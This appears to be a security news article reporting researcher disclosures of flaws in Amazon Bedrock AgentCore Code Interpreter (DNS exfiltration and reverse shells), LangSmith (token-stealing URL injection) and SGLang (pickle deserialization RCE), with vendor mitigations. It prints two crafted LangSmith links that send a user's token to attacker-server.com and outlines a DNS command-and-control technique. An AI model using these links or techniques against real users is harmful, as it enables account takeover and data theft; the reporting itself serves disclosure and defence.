---
ai_commentary: []
ai_commentary_meta:
  content_digest: ''
  generated_at: ''
  model: ''
  prompt_version: ''
  provider: ''
category: ai-security
date: '2026-03-18T03:01:10.412482+00:00'
exported_at: '2026-03-18T03:01:14.049941+00:00'
feed: https://feeds.feedburner.com/TheHackersNews
language: en
source_url: https://thehackernews.com/2026/03/ai-flaws-in-amazon-bedrock-langsmith.html
structured_data:
  about: []
  author: ''
  description: DNS flaw in Amazon Bedrock and critical AI vulnerabilities expose data
    and enable RCE, risking breaches and infrastructure compromise.
  headline: AI Flaws in Amazon Bedrock, LangSmith, and SGLang Enable Data Exfiltration
    and RCE
  inLanguage: en
  keywords: []
  main_image: ''
  original_source: https://thehackernews.com/2026/03/ai-flaws-in-amazon-bedrock-langsmith.html
  publisher:
    logo: /favicon.ico
    name: GTCode
title: AI Flaws in Amazon Bedrock, LangSmith, and SGLang Enable Data Exfiltration
  and RCE
updated_at: '2026-03-18T03:01:10.412482+00:00'
url_hash: bbc45f04a79cf5cabdee46632df8c5d44b1d2c98
---

Cybersecurity researchers have disclosed details of a new method for exfiltrating sensitive data from artificial intelligence (AI) code execution environments using domain name system (DNS) queries.

In a report published Monday, BeyondTrust
[revealed](https://www.beyondtrust.com/blog/entry/aws-bedrock-agentcore-sandbox-breakout)
that Amazon Bedrock AgentCore Code Interpreter's sandbox mode permits outbound DNS queries that an attacker can exploit to enable interactive shells and bypass network isolation. The issue, which does not have a CVE identifier, carries a CVSS score of 7.5 out of 10.0.

[Amazon Bedrock AgentCore Code Interpreter](https://aws.amazon.com/blogs/machine-learning/introducing-the-amazon-bedrock-agentcore-code-interpreter/)
is a fully managed service that enables AI agents to securely execute code in
[isolated sandbox environments](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/code-interpreter-tool.html)
, such that agentic workloads cannot access external systems. It was launched by Amazon in August 2025.

The fact that the service allows DNS queries despite "no network access" configuration can allow "threat actors to establish command-and-control channels and data exfiltration over DNS in certain scenarios, bypassing the expected network isolation controls," Kinnaird McQuade, chief security architect at BeyondTrust, said.

In an experimental attack scenario, a threat actor can abuse this behavior to set up a bidirectional communication channel using DNS queries and responses, obtain an interactive reverse shell, exfiltrate sensitive information through DNS queries if their IAM role has permissions to access AWS resources like S3 buckets storing that data, and perform command execution.

What's more, the DNS communication mechanism can be abused to deliver additional payloads that are fed to the Code Interpreter, causing it to poll the DNS command-and-control (C2) server for commands stored in DNS A records, execute them, and return the results via DNS subdomain queries.

It's worth noting that Code Interpreter requires an IAM role to access AWS resources. However, a simple oversight can cause an overprivileged role to be assigned to the service, granting it broad permissions to access sensitive data.

"This research demonstrates how DNS resolution can undermine the network isolation guarantees of sandboxed code interpreters," BeyondTrust said. "By using this method, attackers could have exfiltrated sensitive data from AWS resources accessible via the Code Interpreter's IAM role, potentially causing downtime, data breaches of sensitive customer information, or deleted infrastructure."

Following responsible disclosure in September 2025, Amazon has determined it to be intended functionality rather than a defect, urging customers to use
[VPC mode](https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html)
instead of sandbox mode for complete network isolation. The tech giant is also recommending the use of a
[DNS firewall](https://aws.amazon.com/blogs/security/protect-against-advanced-dns-threats-with-amazon-route-53-resolver-dns-firewall/)
to filter outbound DNS traffic.

"To protect sensitive workloads, administrators should inventory all active AgentCore Code Interpreter instances and immediately migrate those handling critical data from Sandbox mode to VPC mode," Jason Soroko, senior fellow at Sectigo, said.

"Operating within a VPC provides the necessary infrastructure for robust network isolation, allowing teams to implement strict security groups, network ACLs, and Route53 Resolver DNS Firewalls to monitor and block unauthorized DNS resolution. Finally, security teams must rigorously audit the IAM roles attached to these interpreters, strictly enforcing the principle of least privilege to restrict the blast radius of any potential compromise."

## LangSmith Susceptible to Account Takeover Flaw

The disclosure comes as Miggo Security disclosed a high-severity security flaw in
[LangSmith](https://thehackernews.com/2025/06/langchain-langsmith-bug-let-hackers.html)
(
[CVE-2026-25750](https://nvd.nist.gov/vuln/detail/cve-2026-25750)
, CVSS score: 8.5) that exposed users to potential token theft and account takeover. The issue, which affects both self-hosted and cloud deployments, has been addressed in LangSmith version 0.12.71 released in December 2025.

The shortcoming has been characterized as a case of URL parameter injection stemming from a lack of validation on the baseUrl parameter, enabling an attacker to steal a signed-in user's bearer token, user ID, and workspace ID transmitted to a server under their control through social engineering techniques like tricking the victim into clicking on a specially crafted link like below -

* Cloud - smith.langchain[.]com/studio/?baseUrl=https://attacker-server.com
* Self-hosted - <LangSmith\_domain\_of\_the\_customer>/studio/?baseUrl=https://attacker-server.com

Successful exploitation of the vulnerability could allow an attacker to gain unauthorized access to the AI's trace history, as well as expose internal SQL queries, CRM customer records, or proprietary source code by reviewing tool calls.

"A logged-in LangSmith user could be compromised merely by accessing an attacker-controlled site or by clicking a malicious link," Miggo researchers Liad Eliyahu and Eliana Vuijsje
[said](https://www.miggo.io/post/hack-the-ai-brain-uncovering-an-account-takeover-vulnerability-in-langsmith)
.

"This vulnerability is a reminder that AI observability platforms are now critical infrastructure. As these tools prioritize developer flexibility, they often inadvertently bypass security guardrails. This risk is compounded because, like 'traditional' software, AI Agents have deep access to internal data sources and third-party services."

## Unsafe Pickle Deserialization Flaws in SGLang

Security vulnerabilities have also been flagged in SGLang, a popular open-source framework for serving large language models and multimodal AI models, which, if successfully exploited, could trigger
[unsafe pickle deserialization](https://thehackernews.com/2025/02/malicious-ml-models-found-on-hugging.html)
, potentially resulting in remote code execution.

The vulnerabilities, discovered by Orca security researcher Igor Stepansky, remain unpatched as of writing. A brief description of the flaws is as follows -

* **[CVE-2026-3059](https://www.cve.org/CVERecord?id=CVE-2026-3059)**
  (CVSS score: 9.8) - An unauthenticated remote code execution vulnerability through the ZeroMQ (aka ZMQ) broker, which deserializes untrusted data using pickle.loads() without authentication. It affects SGLang's multimodal generation module.
* **[CVE-2026-3060](https://www.cve.org/CVERecord?id=CVE-2026-3060)**
  (CVSS score: 9.8) - An unauthenticated remote code execution vulnerability through the disaggregation module, which deserializes untrusted data using pickle.loads() without authentication. It affects SGLang' encoder parallel disaggregation system.
* **[CVE-2026-3989](https://www.cve.org/CVERecord?id=CVE-2026-3989)**
  (CVSS score: 7.8) - The use of an insecure pickle.load() function without validation and proper deserialization in SGLang's "replay\_request\_dump.py," which can be exploited by providing a malicious pickle file.

"The first two allow unauthenticated remote code execution against any SGLang deployment that exposes its multimodal generation or disaggregation features to the network," Stepansky
[said](https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities/)
. "The third involves insecure deserialization in a crash dump replay utility."

In a coordinated advisory, the CERT Coordination Center (CERT/CC) said SGLang is vulnerable to CVE-2026-3059 when the multimodal generation system is enabled, and to CVE-2026-3060 when the encoder parallel disaggregation system is enabled.

"If either condition is met and an attacker knows the TCP port on which the ZMQ broker is listening and can send requests to the server, they can exploit the vulnerability by sending a malicious pickle file to the broker, which will then deserialize it," CERT/CC
[said](https://kb.cert.org/vuls/id/665416)
.

Users of SGLang are recommended to restrict access to the service interfaces and ensure they are not exposed to untrusted networks. It's also advised to implement adequate network segmentation and access controls to prevent unauthorized interaction with the ZeroMQ endpoints.

While there is no evidence that these vulnerabilities have been exploited in the wild, it's crucial to monitor for unexpected inbound TCP connections to the ZeroMQ broker port, unexpected child processes spawned by the SGLang Python process, file creation in unusual locations by the SGLang process, and outbound connections from the SGLang process to unexpected destinations.